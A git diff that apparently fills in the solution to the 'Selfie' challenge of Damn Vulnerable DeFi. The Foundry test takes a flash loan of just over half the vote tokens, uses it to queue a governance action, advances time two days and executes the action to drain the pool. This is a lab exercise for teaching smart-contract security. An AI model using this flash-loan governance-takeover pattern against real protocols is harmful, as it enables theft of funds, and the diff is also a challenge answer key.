@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieFlashLoanBorrower} from "./SelfieFlashLoanBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,14 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // Propose a governance action to emergency exit
+            // Flashloan half of all vote tokens + 1 (since more than half is needed)
+        SelfieFlashLoanBorrower sflb = new SelfieFlashLoanBorrower(pool, recovery);
+        pool.flashLoan(sflb, address(token), token.totalSupply() / 2 + 1, "");
+        // Execute the action
+            // You have to wait 2 days before the action can be executed
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(1);
     }
 
     /**
